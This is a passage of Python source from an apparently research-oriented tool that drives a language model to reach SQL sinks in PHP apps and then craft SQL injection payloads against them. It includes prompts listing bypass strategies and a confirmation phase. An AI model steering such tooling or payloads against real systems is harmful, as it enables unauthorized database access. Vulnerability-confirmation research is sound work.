        cf = _containing_file(funcid, fig, nodes) if funcid else ""
        if cf and osp.basename(cf) != host_basename:
            continue
        keep_lines.add(ln)

    for ln in range(max(1, terminal_line - 2), terminal_line + 1):
        keep_lines.add(ln)
    if cutoff_line and cutoff_line > terminal_line:
        for ln in range(max(1, cutoff_line - 2), cutoff_line + 1):
            if ln <= len(lines):
                keep_lines.add(ln)

    if not keep_lines:
        return None

    if len(keep_lines) > max_lines_total:
        sorted_by_distance = sorted(keep_lines,
                                     key=lambda l: abs(l - terminal_line))
        keep_lines = set(sorted_by_distance[:max_lines_total])

    sorted_ls = sorted(keep_lines)
    out_pieces = [f"    {ln:>4}: {lines[ln - 1]}" for ln in sorted_ls]
    return "\n".join(out_pieces)


def _terminal_blocker_source_slice(
    history, pipeline_result, *,
    before: int = 10, after: int = 2, max_lines_total: int = 40,
    iter_trace=None,
    working_dir: str = "",
) -> str:
    if iter_trace is None:
        if not history.iterations:
            return ""
        iter_trace = history.iterations[-1]
    last_tb = iter_trace.terminal_blocker
    if not (last_tb and last_tb.location.get("file")):
        return ""

    cpath = last_tb.location.get("file", "")
    proj_root = (pipeline_result.get("_project_root_host")
                  or str(Path(pipeline_result["entry_file"]).parent))
    cont_root = (pipeline_result.get("_container_root")
                  or "/app/sqli_chain_demo").rstrip("/")
    app_name = osp.basename(cont_root)
    host_path = cpath.replace(cont_root, proj_root) \
                     .replace(f"/var/www/html/{app_name}", proj_root) \
                     .replace("/app/sqli_chain_demo", proj_root) \
                     .replace("/var/www/html/sqli_chain_demo", proj_root)
    if not Path(host_path).exists():
        return ""

    try:
        lines = Path(host_path).read_text(
            encoding="utf-8", errors="replace"
        ).splitlines()
    except Exception:
        return ""
    try:
        ln = int(last_tb.location.get("line", 0))
    except (ValueError, TypeError):
        return ""
    if ln <= 0 or ln > len(lines):
        return ""

    if working_dir:
        exit_line = ln
        slice_anchor = ln
        ex_dict = last_tb.raw.get("exit", {})
        tc = ex_dict.get("trigger_condition", {})
        try:
            tc_line = int(tc.get("line") or 0)
            if tc_line > 0:
                slice_anchor = tc_line
        except (ValueError, TypeError):
            pass
        try:
            df_slice = _terminal_blocker_dataflow_slice(
                host_path, slice_anchor, working_dir,
                max_lines_total=max_lines_total,
                cutoff_line=exit_line if slice_anchor != exit_line else None)
        except Exception as e:
            df_slice = None
            print(f"[m3] dataflow slice failed ({type(e).__name__}: {e}); "
                  f"falling back to positional window")
        if df_slice:
            if slice_anchor != exit_line:
                header = (
                    f"# Source at LAST iter's DOMINATING GUARD "
                    f"({Path(host_path).name}:{slice_anchor}) — the predicate "
                    f"that entered the exit branch (terminal exit at line "
                    f"{exit_line}). DATA-FLOW slice (REACHES backward "
                    f"from variables on the guard line).\n"
                )
            else:
                header = (
                    f"# Source at LAST iter's terminal blocker "
                    f"({Path(host_path).name}:{exit_line}) — DATA-FLOW slice "
                    f"(REACHES backward from variables on terminal line)\n"
                )
            return f"{header}```php\n{df_slice}\n```\n"

    fn_decl_re = re.compile(
        r"^\s*(?:(?:public|protected|private|static|abstract|final)\s+)*"
        r"function\s+\w+\s*\(", re.IGNORECASE)
    fn_start = 0
    for i in range(ln - 1, max(-1, ln - 200), -1):
        if fn_decl_re.match(lines[i]):
            fn_start = i + 1
            break

    start = max(1, (fn_start if fn_start else ln - before))
    end   = min(len(lines), ln + after)

    region_lines = end - start + 1
    if region_lines > max_lines_total:
        head_n = 1
        tail_n = max_lines_total - head_n - 1
        head_end   = start + head_n - 1
        tail_start = max(head_end + 1, end - tail_n + 1)
        elided = tail_start - head_end - 1
        rendered = (
            [f"    {start:>4}: {lines[start - 1]}"]
            + ([f"        // ... ({elided} lines elided) ..."] if elided > 0 else [])
            + [f"    {n:>4}: {lines[n - 1]}" for n in range(tail_start, end + 1)]
        )
    else:
        rendered = [f"    {n:>4}: {lines[n - 1]}" for n in range(start, end + 1)]

    snippet = "\n".join(rendered)
    return (
        f"# Source at LAST iter's terminal blocker "
        f"({Path(host_path).name}:{start}-{end})\n"
        f"```php\n{snippet}\n```\n"
    )


def _llm_mutate(
    pipeline_result: dict,
    history: RunHistory,
    current_params: dict,
    *,
    phase: str = "reach",
    last_response_excerpt: str = "",
    tracker_summary: Optional[dict] = None,
    llm_call_output_dir: Optional[Path] = None,
    llm_call_index: Optional[int] = None,
    state_provenance: Optional[dict] = None,
) -> tuple[dict, str]:
    constraints = pipeline_result.get("constraints", {})

    sink = constraints.get("sink", {})

    pred_lookahead = {
        int(pl["line"]): pl
        for pl in (constraints.get("predicate_lookahead", []) or [])
        if pl.get("line")
    }

    def _fmt_dist(v):
        return "∞" if v is None else str(v)

    if_lines = []
    by_lineno: dict = {}
    for c in constraints.get("if_constraints", []):
        ln = c.get("lineno")
        by_lineno.setdefault(ln, []).append(c)
    rendered = 0
    for ln, group in by_lineno.items():
        if rendered >= 15:
            break
        first = group[0]
        cases = [g.get("switch_case_value") for g in group if g.get("switch_case_value")]
        if cases:
            disc = first.get("switch_discriminant") or first.get("raw_line", "")[:120]
            params_hint = first.get("params") or []
            if_lines.append(f"  line {ln}  switch ({disc}) — must equal one of: {cases}")
            if params_hint:
                if_lines.append(
                    f"    ├─ discriminant param key(s): {params_hint}  "
                    f"(set one of {cases!r} to satisfy a case)"
                )
            rendered += 1
            continue
        c = first
        if_lines.append(f"  line {ln}  d={c.get('dist')}  {c.get('raw_line', '')[:120]}")
        pl = pred_lookahead.get(int(ln) if ln else 0)
        if pl:
            t, fa = _fmt_dist(pl.get("then_dist")), _fmt_dist(pl.get("false_dist"))
            if_lines.append(
                f"    ├─ True branch (then-body) → dist={t}"
            )
            if_lines.append(
                f"    └─ False branch (skip then-body) → dist={fa}"
            )

    dispatch_lines = []
    seen_sites: set[tuple] = set()
    for dc in constraints.get("dispatch_constraints", []):
        site_file = dc.get("site_file", "")
        site_line = dc.get("site_line", 0)
        site_basename = Path(site_file).name
        ds = dc.get("must_equal") or dc.get("condition_natural", "")[:80]
        param = dc.get("param") or "<unknown — infer from source below>"
        equals_str = f" = {dc.get('must_equal')!r}" if dc.get('must_equal') else ""
        dispatch_lines.append(
            f"- TARGET callee = `{dc.get('callee', '?')}` "
            f"(defined at {Path(dc.get('callee_file', '')).name}:{dc.get('callee_line')}); "
            f"controlled by param '{param}'{equals_str}; "
            f"dispatch site at {site_basename}:{site_line}"
        )
        key = (site_file, site_line)
        if site_file and key not in seen_sites and Path(site_file).exists():
            seen_sites.add(key)
            try:
                lines = Path(site_file).read_text(
                    encoding="utf-8", errors="replace"
                ).splitlines()
                start = max(1, site_line - 25)
                end   = min(len(lines), site_line + 5)
                snippet = "\n".join(
                    f"    {n:>4}: {lines[n-1]}" for n in range(start, end + 1)
                )
                dispatch_lines.append(
                    f"  context ({site_basename}:{start}-{end}):\n```php\n{snippet}\n```"
                )
            except Exception:
                pass

    _dpc = (constraints.get("injection_param_schema") or {}).get("dispatch_param_candidates")
    if isinstance(_dpc, dict) and _dpc.get("candidates"):
        dispatch_lines.append(
            f"- BRANCH-SELECTOR param `{_dpc.get('param')}` MUST be exactly one "
            f"of: {_dpc.get('candidates')} — it picks the dispatch target via "
            f"{_dpc.get('via', '')}. The initial PoC uses "
            f"'{_dpc['candidates'][0]}'; if reach stalls at the dispatch, try a "
            f"DIFFERENT value FROM THIS LIST (do not invent other values)."
        )

    base_iter = None
    if tracker_summary and tracker_summary.get("best_iter") is not None:
        for it in history.iterations:
            if it.iteration_index == tracker_summary["best_iter"]:
                base_iter = it
                break
    if base_iter is None and history.iterations:
        base_iter = history.iterations[-1]

    latest_iter = history.iterations[-1] if history.iterations else None
    in_scope_dyn = constraints.get("in_scope_dynamic_sites", []) or []
    dyn_index: dict[tuple[str, int], dict] = {}
    for d in in_scope_dyn:
        key = (Path(d["file"]).name, int(d["line"]))
        dyn_index[key] = {
            "category": d.get("category", "?"),
            "site_id": d.get("site_id"),
            "callees_observed": [],
        }

    runtime_unknown_dynamic: dict[tuple[str, int], dict] = {}
    if latest_iter:
        for b in latest_iter.blocker_events:
            if b.kind != "dispatch_observed":
                continue
            bn = Path(b.location.get("file", "")).name
            try:
                ln = int(b.location.get("line", 0) or 0)
            except (ValueError, TypeError):
                continue
            callee = b.raw.get("dispatch", {}).get("callee_actual", "")
            if not callee:
                continue
            key = (bn, ln)
            if key in dyn_index:
                dyn_index[key]["callees_observed"].append(callee)

    actual_calls = []
    for (bn, ln), info in sorted(dyn_index.items()):
        callees = info["callees_observed"]
        if not callees:
            actual_calls.append(
                f"  {bn}:{ln} ({info['category']}) — not hit this iter")
            continue
        from collections import Counter
        cnt = Counter(callees)
        parts = ", ".join(f"{c} [{n}×]" for c, n in cnt.most_common(5))
        actual_calls.append(f"  {bn}:{ln} ({info['category']}) → {parts}")

    fixtures_section = ""
    proj_root = Path(pipeline_result["entry_file"]).parent
    fixture_files = []
    for pat in ("init.php", "seed*.sql", "fixtures*.php", "*seed*.php"):
        fixture_files.extend(sorted(proj_root.glob(pat)))
    fixture_blocks = []
    for fp in fixture_files[:3]:
        try:
            content = fp.read_text(encoding="utf-8", errors="replace")
            if len(content) > 4000:
                content = content[:4000] + "\n... [truncated]"
            fixture_blocks.append(f"## {fp.name}\n```\n{content}\n```")
        except Exception:
            pass
    if fixture_blocks:
        fixtures_section = (
            "# Project fixtures (DB seed / initial state — what already exists)\n"
            + "\n".join(fixture_blocks) + "\n"
        )

    latest_iter = history.iterations[-1] if history.iterations else None
    terminal_context = _terminal_blocker_source_slice(
        history, pipeline_result,
        before=10, after=2, max_lines_total=40,
        iter_trace=latest_iter,
        working_dir=pipeline_result.get("_working_dir", ""),
    )

    frontier_note = ""
    if tracker_summary:
        best_it   = tracker_summary.get("best_iter")
        best_sc   = tracker_summary.get("best_score")
        latest_it = tracker_summary.get("current_latest_iter")
        latest_sc = tracker_summary.get("latest_score")
        over_b    = tracker_summary.get("over_budget", [])

        best_trace = next(
            (it for it in history.iterations if it.iteration_index == best_it),
            None,
        )

        with_dist = [it for it in history.iterations if it.min_distance is not None
                     and it.min_distance >= 0]
        if with_dist:
            min_d_seen = sorted({it.min_distance for it in with_dist})[:3]
            closest_iters = [it for it in with_dist if it.min_distance in min_d_seen]
            closest_iters.sort(key=lambda it: (it.min_distance, it.iteration_index))
        else:
            closest_iters = []

        bailout_iters = [it for it in history.iterations
                         if getattr(it, "bailout_end", False)]

        def _decode_poc_body(body: str) -> dict:
            from urllib.parse import parse_qsl
            try:
                return dict(parse_qsl(body or "", keep_blank_values=True))
            except Exception:
                return {}

        lines = [
            "# Search progress — driver-managed state (FACTS, not hints)",
            "",
            "## Schema reference (fixed; read once)",
            "Each iter is scored with a 5-tuple, SMALLER is BETTER, lex-ordered:",
            "  [0] sink_reached:        0 = sink ran this iter; 1 = it didn't (decides everything else)",
            "  [1] min_distance:        SAST-computed hop count from the nearest runtime event",
            "                           to the sink line. Smaller = a runtime event landed closer.",
            "                           -1 / inf means no event matched the SAST table.",
            "  [2] -target_path_events: more on-target dispatches → more negative → better",
            "  [3] wrong_dispatch_count: routing to unexpected callees",
            "  [4] over_budget_penalty: blocker visited beyond budget",
            "",
            "`iter #N` below cross-refs the # Recent iterations block: e.g.",
            "`Best: iter #3` means iteration 3 listed there is the current",
            "search frontier (next mutation BASE).",
            "",
        ]

        plateau_kind = tracker_summary.get("plateau_kind", "ok")
        backtrack_consumed = tracker_summary.get("backtrack_consumed", [])
        lines.append(f"## Best iter so far: #{best_it}  score={best_sc}")
        if best_trace and best_trace.poc and best_trace.poc.body:
            lines.append(f"  base PoC body: `{best_trace.poc.body}`")
        top_k = tracker_summary.get("top_k_bests", []) or []
        if len(top_k) > 1:
            lines.append(f"  (top-{len(top_k)} bests retained for backtrack rebasing):")
            for tk in top_k:
                tag = " [CONSUMED]" if tk["iter"] in backtrack_consumed else ""
                lines.append(
                    f"    #{tk['iter']}  score={tk['score']}  d={tk['min_distance']}{tag}"
                )
        if plateau_kind == "ok":
            lines.append("  (driver IS NOT rebasing on this PoC right now —")
            lines.append("   plateau_kind=ok means the latest PoC stays the base;")
            lines.append("   you're free to deviate from any param.)")
        lines.append("")

        if closest_iters:
            lines.append("## Closest-to-sink iters (top distance values; PoC shown)")
            for it in closest_iters:
                lines.append(
                    f"  iter #{it.iteration_index}: min_distance={it.min_distance}"
                )
                lines.append(f"    PoC: `{it.poc.body}`")
            lines.append("")

        if bailout_iters:
            lines.append("## BAILOUT STATES TO AVOID")
            lines.append(
                "Each item below is a PoC that took the request into an "
                "early_exit branch via a guard NOT on the sink path. The "
                "param values shown made that guard's then-branch execute, "
                "killing the request. Your next mutation MUST flip those "
                "guards to FALSE (otherwise the request dies again)."
            )
            lines.append("")
            for it in bailout_iters[-5:]:
                bp = it.bailout_predicate or {}
                gfile = Path(bp.get("file","")).name
                gline = bp.get("line")
                op1v = bp.get("op1", {}).get("value", "")
                exit_at = bp.get("exit_at_line")
                guard_src = ""
                gfile_full = bp.get("file") or ""
                try:
                    proj_root = pipeline_result.get("_project_root_host") or ""
                    cont_root = (pipeline_result.get("_container_root") or "").rstrip("/")
                    if cont_root and proj_root and gfile_full.startswith(cont_root):
                        host_path = gfile_full.replace(cont_root, proj_root, 1)
                        lines_src = Path(host_path).read_text(
                            encoding="utf-8", errors="replace").splitlines()
                        if gline and 1 <= int(gline) <= len(lines_src):
                            guard_src = lines_src[int(gline) - 1].strip()
                except Exception:
                    guard_src = ""
                poc_params = _decode_poc_body(it.poc.body)
                guard_param_guess = ""
                for k, v in poc_params.items():
                    if guard_src and k in guard_src:
                        guard_param_guess = f"param `{k}` = {v!r}"
                        break

                lines.append(
                    f"  iter #{it.iteration_index}: early_exit @ "
                    f"{Path(it.terminal_blocker.location.get('file','')).name}"
                    f":{it.terminal_blocker.location.get('line')}"
                )
                lines.append(
                    f"    triggered by guard at {gfile}:{gline}"
                )
                if guard_src:
                    lines.append(f"    guard source: {guard_src}")
                lines.append(
                    f"    runtime saw condition_value=TRUE → entered then-branch → exit"
                )
                if guard_param_guess:
                    lines.append(
                        f"    likely culprit: {guard_param_guess}"
                    )
                lines.append(
                    f"    PoC was: `{it.poc.body}`"
                )
                lines.append(
                    f"    ➜ ACTION: in next mutation, change the param so this"
                    f" guard evaluates FALSE."
                )
            lines.append("")

        if over_b:
            lines.append("## Stalled blockers (over-budget — same line hit ≥ budget times)")
            for b in over_b[:8]:
                lines.append(
                    f"  {b['kind']} @ {b['file']}:{b['line']}  ({b['count']} visits)"
                )
            lines.append(
                "  ➜ Don't keep retrying the SAME fix on these. Switch"
                " strategy: different param, different value class, alt"
                " dispatch candidate, or DB-state setup."
            )
            lines.append("")

        if tracker_summary.get("diverged_from_best"):
            lines.append(
                "## NOTE: latest iter diverged from best's call chain AND is not better."
            )
            lines.append(
                "  Driver REBASED current_params to best PoC. Don't pursue divergent path further."
            )
            lines.append("")

        plateau_kind = tracker_summary.get("plateau_kind", "ok")
        if plateau_kind != "ok":
            lit_pat = re.compile(
                r"\$_(?:REQUEST|POST|GET|COOKIE)\s*\[\s*['\"](\w+)['\"]\s*\]"
                r"\s*[!=]==?\s*['\"]([^'\"]+)['\"]")
            literals_in_guards: dict[str, set[str]] = {}
            for c in constraints.get("if_constraints", []) or []:
                cond = c.get("condition", "") or c.get("raw_line", "")
                for param, val in lit_pat.findall(cond):
                    literals_in_guards.setdefault(param, set()).add(val)
            tried_values: dict[str, set[str]] = {}
            for it in history.iterations:
                body = it.poc.body or ""
                from urllib.parse import parse_qsl
                try:
                    for k, v in parse_qsl(body, keep_blank_values=True):
                        tried_values.setdefault(k, set()).add(v)
                except Exception:
                    pass
            untried_rows = []
            for param, lits in sorted(literals_in_guards.items()):
                already = tried_values.get(param, set())
                gap = sorted(lits - already)
                if gap:
                    tried_show = sorted(already & lits) or sorted(list(already)[:4])
                    untried_rows.append(
                        f"    - {param}: tried {tried_show}. Untried literals from guards: {gap}"
                    )

        if plateau_kind == "stuck":
            lines.append("## ⛔ BACKTRACK [stuck]")
            lines.append(
                f"  Last {tracker_summary.get('plateau_window', 3)} iters have IDENTICAL scores —"
                f" local mutation is going nowhere."
            )
            consumed = tracker_summary.get("backtrack_consumed", []) or []
            if consumed:
                rebase_iter = consumed[-1]
                lines.append(
                    f"  Driver REBASED on top-K best #{rebase_iter} (its PoC is now"
                    f" `current_params` below)."
                )
            else:
                lines.append("  No fresh top-K backtrack target available — escalate strategy.")
            if untried_rows:
                lines.append("  Mutables with literal values you haven't tried yet:")
                lines.extend(untried_rows)
                lines.append(
                    "  ➜ Try these untried literals first; they appear in"
                    " path-condition guards."
                )
            else:
                lines.append("  Switch strategy:")
                lines.append("    (a) mutate a DIFFERENT param than the one you've been touching")
                lines.append("    (b) try an alternate dispatch candidate")
                lines.append("    (c) propose a multi-step setup (POST a setup request first)")
                lines.append("    (d) try an alternate entry URL")
            lines.append("")

        elif plateau_kind == "regress_speculative":
            spec_streak = tracker_summary.get("speculative_streak", 0)
            spec_max    = tracker_summary.get("speculative_max_try", 3)
            lines.append("## ⚠ SPECULATIVE [regress_speculative]")
            lines.append(
                f"  Last {tracker_summary.get('plateau_window', 3)} iters' distance is"
                f" monotonically increasing — BUT the execution path goes through"
                f" an if-body containing a DYNAMIC DISPATCH site."
            )
            lines.append(
                f"  Runtime dispatch may still resolve to a sink-reaching callee,"
                f" so the driver is LETTING THIS RUN ({spec_streak}/{spec_max}"
                f" speculative iters used). After {spec_max} the driver"
                f" force-rebases to a top-K best."
            )
            lines.append(
                "  ➜ Consider mutating params that route the dispatch toward a"
                " different runtime callee. The current best/closest iters above"
                " stay available as fallback if you'd rather backtrack manually."
            )
            lines.append("")

        elif plateau_kind == "regress_dead":
            lines.append("## ⛔ BACKTRACK [regress_dead]")
            lines.append(
                f"  Last {tracker_summary.get('plateau_window', 3)} iters' distance is"
                f" monotonically increasing AND no speculative branch (dispatch"
                f" inside an if-body) on the path. The mutation is walking off"
                f" the sink path with no possible upside."
            )
            consumed = tracker_summary.get("backtrack_consumed", []) or []
            if consumed:
                rebase_iter = consumed[-1]
                lines.append(
                    f"  Driver REBASED on top-K best #{rebase_iter} (its PoC is now"
                    f" `current_params` below)."
                )
            if untried_rows:
                lines.append("  Mutables with literal values you haven't tried yet:")
                lines.extend(untried_rows)
            if bailout_iters:
                last_bail = bailout_iters[-1]
                bp = last_bail.bailout_predicate or {}
                lines.append(
                    f"  Latest death-trap guard: {Path(bp.get('file','')).name}:"
                    f"{bp.get('line')}  →  exit @ line {bp.get('exit_at_line')}"
                )
                lines.append("  ➜ Pick a param value that flips THAT guard to FALSE.")
            lines.append("")

        rd = tracker_summary.get("runtime_discoveries", []) or []
        if rd:
            lines.append("## Runtime-discovered dispatch sites (not captured by Module 1 static analysis)")
            for d in rd[:6]:
                callees = ", ".join(d["callees"][:5])
                lines.append(
                    f"  {d['file']}:{d['line']}  callees: {callees}"
                    f"  (first seen iter {d['first_iter']})"
                )
            lines.append(
                "  → If your terminal blocker is downstream, the mutable param"
                " controlling this dispatch is a user-input key. Discover its"
                " name in source around the line and mutate it."
            )

        frontier_note = "\n".join(lines) + "\n"

    iter_lines = []
    for it in history.iterations[-3:]:
        tb = it.terminal_blocker
        msg = ""
        trig = ""
        exc_cls = ""
        if tb:
            if tb.kind == "php_fatal":
                raw_inner = tb.raw.get("raw", tb.raw) if isinstance(tb.raw.get("raw"), dict) else tb.raw
                msg = (raw_inner.get("message", "") or "")[:300]
                exc_cls = raw_inner.get("error_type_name", "")
            else:
                ex_dict = tb.raw.get("exit", {})
                msg = (ex_dict.get("message", {}).get("value", "") or "")[:160]
                exc_cls = ex_dict.get("exception_class") or ""
                tc  = ex_dict.get("trigger_condition", {})
                if tc:
                    trig = (f"triggered by {tc.get('opcode')}@{Path(tc.get('file','')).name}:"
                            f"{tc.get('line')} "
                            f"(op1={tc.get('op1',{}).get('value')!r} truthy={tc.get('condition_value')})")
        worst_delta = None
        for b in it.blocker_events:
            if b.kind == "dispatch_observed":
                d = b.raw.get("distance_delta_from_prev_callee")
                if isinstance(d, (int, float)) and d > 0:
                    if worst_delta is None or d > worst_delta:
                        worst_delta = d
        delta_note = (f"  ⚠ worst Δ from prior callee = +{worst_delta} "
                      f"(callee took us further from sink)" if worst_delta else "")
        iter_lines.append(
            f"  iter {it.iteration_index}: PoC body=`{it.poc.body}`\n"
            f"    blockers={it.total_blockers_emitted}, min_dist={it.min_distance}{delta_note}\n"
            f"    terminal: {tb.kind if tb else 'none'} @ "
            f"{Path(tb.location.get('file','')).name if tb else ''}:"
            f"{tb.location.get('line') if tb else ''}"
            f"{('  exception='+exc_cls) if exc_cls else ''}\n"
            f"    message: {msg}\n"
            f"    {trig}"
        )

    phase_goal = (
        "GOAL: REACH the SQL sink line (pass every guard so SQL executes)."
        if phase == "reach"
        else
        "GOAL: TRIGGER A CONFIRMED INJECTION. The sink line already executes "
        "with benign values; now you must craft an SQLi payload in a "
        "user-controlled STRING field that gets concatenated into SQL "
        "without sanitization. Success = SQL error in response OR row count "
        "exceeds the legitimate baseline. Keep all reach-phase params unchanged."
    )

    inj_chain      = constraints.get("injection_chain", []) or []
    sink_input_keys = {ic.get("varname") for ic in inj_chain if ic.get("varname")}
    guard_keys      = set()
    for c in (constraints.get("if_constraints", []) or []):
        for p in c.get("params", []) or []:
            guard_keys.add(p)
    for eg in (constraints.get("exit_guards", []) or []):
        for p in eg.get("params", []) or []:
            guard_keys.add(p)

    cur_keys = set(current_params.keys())
    if phase == "reach":
        mutables_now = sorted(guard_keys & cur_keys)
        frozen_now   = sorted((sink_input_keys & cur_keys) - guard_keys)
    else:
        mutables_now = sorted(sink_input_keys & cur_keys)
        frozen_now   = sorted(cur_keys - sink_input_keys)

    _ifc_for_pin = constraints.get("if_constraints", []) or []
    _wd_for_pin = pipeline_result.get("_working_dir", "")
    strong_targets: dict = {}
    for k in mutables_now:
        if _param_constraint_strength(_ifc_for_pin, k) == "strong":
            tv = _pick_strong_value(k, _ifc_for_pin, working_dir=_wd_for_pin)
            if tv is not None:
                strong_targets[k] = tv

    def _fmt_keyval(k):
        v = current_params.get(k, "")
        v = v if isinstance(v, str) else str(v)
        base = (f"{k}={v!r}" if len(v) < 30
                else f"{k}=<{len(v)}-char value>")
        tv = strong_targets.get(k)
        if tv is not None and v != tv:
            base += f"  → must equal {tv!r}"
        elif tv is not None and v == tv:
            base += f"  (already satisfies: == {tv!r})"
        return base

    if phase == "reach":
        _mut_label = ("Reach-gate params (these drive control-flow to the sink). "
                      "SET each to the value that satisfies its guard (those marked "
                      "`→ must equal X`); KEEP the ones marked `(already satisfies)` "
                      "as-is — do NOT change a gate that's already passing:")
        _frz_label = ("Injection-target / free params — hold benign this phase "
                      "(payloads belong to Phase B; do NOT inject here):")
        _mut_empty = "  (none — no reach gates referenced by current params)"
    else:
        _mut_label = ("Mutables this phase (sink-input injection targets — put the "
                      "payload in these):")
        _frz_label = ("Frozen this phase (reach values that satisfy guards — DO NOT "
                      "mutate, or a currently-passing guard re-triggers):")
        _mut_empty = "  (none — all params already passing or no candidates)"

    phase_param_section = ""
    if mutables_now or frozen_now:
        phase_param_section = (
            f"# Phase {('A — REACH' if phase=='reach' else 'B — CONFIRM')} param classification\n"
            f"{_mut_label}\n"
            + ("  " + "\n  ".join(_fmt_keyval(k) for k in mutables_now)
               if mutables_now else _mut_empty)
            + "\n"
            f"{_frz_label}\n"
            + ("  " + "\n  ".join(_fmt_keyval(k) for k in frozen_now)
               if frozen_now else "  (none)")
            + "\n"
        )

    last_resp_section = (
        f"# Latest response excerpt (look at [debug] SQL line — what got built)\n"
        f"```\n{last_response_excerpt[:600]}\n```\n"
        if last_response_excerpt else ""
    )

    state_prov_section = ""
    if state_provenance and state_provenance.get("classification") == "STATE_SEED_REQUIRED":
        _sp_read = state_provenance.get("read") or {}
        _sp_keys = state_provenance.get("selector_input_keys") or []
        _sp_op = ", ".join("$" + o for o in state_provenance.get("operand", []))
        _sel_line = (
            f"  - The read's query selector IS influenced by request key(s) "
            f"{_sp_keys}. A param value here MAY select an already-existing row — "
            f"vary these FIRST; they are your highest-value mutation targets."
            if _sp_keys else
            f"  - No request key was found mapping DIRECTLY to the selector — it "
            f"derives from a DB-loaded value (e.g. a row selected upstream by an "
            f"id-like param). The param that selects WHICH row loads may still "
            f"matter indirectly: vary the entry's id/selector-like params and see "
            f"if the read starts returning rows. Do NOT map an unrelated param to "
            f"this guard just to have something to change."
        )
        state_prov_section = (
            f"# Terminal guard provenance (runtime + static analysis)\n"
            f"The terminal guard at line {state_provenance.get('guard_line')} tests "
            f"`{_sp_op}`, which is NOT itself a request param — it is the result of "
            f"the DB/IO read `{_sp_read.get('func')}()` at line {_sp_read.get('line')}, "
            f"observed EMPTY at runtime. Changing params will NOT open this guard "
            f"unless a param makes that read return rows.\n"
            f"{_sel_line}\n"
            f"  - If the read returns rows only when the backing store already "
            f"contains matching data (a STATE precondition), no param will help; the "
            f"search will conclude that on its own. Your job this iter is to TRY the "
            f"selector-influencing param(s) above.\n"
        )

    prompt = f"""\
You are mutating an HTTP POST body to drive a PHP web app to a SQL injection sink.
{phase_goal}

# Target
Entry URL: {pipeline_result['entry_url']}
Sink: {sink.get('lineno', '?')} — `{sink.get('statement', '')[:200]}`

# Path conditions to sink (from static analysis, distance-ordered)
{chr(10).join(if_lines) if if_lines else '  (none)'}

# Dynamic-dispatch decisions required to reach the sink file
{chr(10).join(dispatch_lines) if dispatch_lines else '  (none)'}

# Dynamic dispatch sites in scope (Module ① flagged from dispatch_sinks.csv)
# — these are real `$var()` / `call_user_func()` / variable-method sites
# where the runtime callee depends on params and YOU may need to mutate
# params to route to a different callee. Plain `funcName()` calls are
# excluded.
{chr(10).join(actual_calls) if actual_calls else '  (none — no in-scope dynamic dispatch sites)'}

{phase_param_section}
{fixtures_section}
{terminal_context}
{state_prov_section}
{frontier_note}
{last_resp_section}
# Recent iterations
{chr(10).join(iter_lines)}

# Current PoC params (JSON)
{json.dumps(current_params)}

# Task
Output the next PoC body. Use this procedure:

1. **Identify ALL params that need changing.** You can mutate multiple
   params in one iteration — there is NO "one change at a time" rule.
   Mutation targets are the params whose CURRENT VALUE doesn't satisfy
   a guard on the sink path:
   - The terminal blocker's source slice (above) shows the IMMEDIATE
     failing guard. If that guard references a request param, its
     param(s) are top priority. BUT if a "Terminal guard provenance"
     section above says the guard tests a DB/IO-read result (not a
     param), changing params will NOT directly open it — only a param
     that influences the read's query selector can help, and only if a
     matching row already exists. Do not invent a param mapping that the
     source doesn't support.
   - The "Path conditions to sink" list shows all guards. For each
     guard, check if your current PoC satisfies it; if not, that's a
     target too. Multiple unsatisfied guards → mutate multiple params.

2. **Do NOT touch params that already help.** A param that's already
   driving the request closer to sink (e.g. its value satisfies a sink-
   path guard) should be left as-is. Only "free / unsatisfied" params
   are mutation candidates.

3. **AVOID the BAILOUT STATES.** Every BAILOUT STATE listed above is a
   PoC that died in an exit branch. Look at which param value satisfied
   the killer guard, and pick the OPPOSITE class of value (typically:
   if the guard requires the value to equal a literal X, use ANY value
   that isn't X — empty string or `0` usually works). Do NOT reuse the
   value that triggered the bailout.

4. **Choose the value from the source code:**
   - String equality (`$x === 'foo'`) → set to `foo` literally.
   - Regex / charset guard → pick a value that matches.
   - Path / file existence → use a known-existing identifier from nearby
     code (e.g. `default` if you see `is_dir(... "/" . $x)` near `$x = "default"`).
   - Dynamic dispatch (`$f()` / `call_user_func`) → pick the callee
     whose body passes input through unchanged (prefer `*_raw` /
     `*_passthrough` / `*_loose`; avoid `*_strict` / `*_validated`).

5. **Place SQLi payloads only when phase=exploit.** When triggering
   the sink (not just reaching it), put the payload in a STRING param
   that the data-flow slice shows being concatenated into `$query`
   WITHOUT sanitization. Do NOT put payloads in params that are
   type-checked, regex-checked, or compared to literals upstream.

Return JSON ONLY (no prose, no fences):
{{
  "params": {{"key": "value", ...}},
  "rationale": "1-3 sentences: which param(s) changed and why each value passes its blocker (or avoids a bailout)"
}}
"""

    response = _llm_chat_resilient(prompt, stage="m3_mutate")
    if response is None:
        return current_params, "(LLM unavailable — all retries exhausted)"

    if llm_call_output_dir is not None and llm_call_index is not None:
        try:
            import time as _t
            llm_call_output_dir.mkdir(parents=True, exist_ok=True)
            fname = llm_call_output_dir / f"llm_call_{llm_call_index:02d}.txt"
            usage = response.get("usage", {}) if isinstance(response, dict) else {}
            with fname.open("w", encoding="utf-8") as fh:
                fh.write(f"=== call #{llm_call_index} ===\n")
                fh.write(f"ts: {_t.time()}\n")
                fh.write(f"stage: m3_mutate\n")
                fh.write(f"model: {response.get('model','?')}\n")
                fh.write(f"prompt_tokens: {usage.get('prompt_tokens','?')}\n")
                fh.write(f"completion_tokens: {usage.get('completion_tokens','?')}\n")
                fh.write(f"cost_usd: {response.get('cost_usd','?')}\n\n")
                fh.write("=== PROMPT ===\n")
                fh.write(prompt)
                fh.write("\n\n=== RESPONSE ===\n")
                fh.write(response.get("content", ""))
                fh.write("\n")
        except Exception as _e:
            print(f"  [llm-call-log] failed to write {fname.name}: {_e}")

    content  = response.get("content", "").strip()

    content = re.sub(r"^```(?:json)?\s*", "", content)
    content = re.sub(r"\s*```$", "", content).strip()

    def _try_parse(s: str):
        try:
            return json.loads(s)
        except json.JSONDecodeError:
            fixed = re.sub(r'\\(?![\\"/bfnrtu])', r'\\\\', s)
            try:
                return json.loads(fixed)
            except json.JSONDecodeError:
                return None

    parsed = _try_parse(content)
    if parsed is None:
        m = re.search(r"\{[\s\S]*\}", content)
        if not m:
            return current_params, f"(LLM response unparseable: {content[:120]})"
        parsed = _try_parse(m.group(0))
        if parsed is None:
            return current_params, f"(LLM JSON unparseable after fixup: {content[:120]})"

    new_params = parsed.get("params", current_params)
    rationale  = parsed.get("rationale", "")
    return new_params, rationale


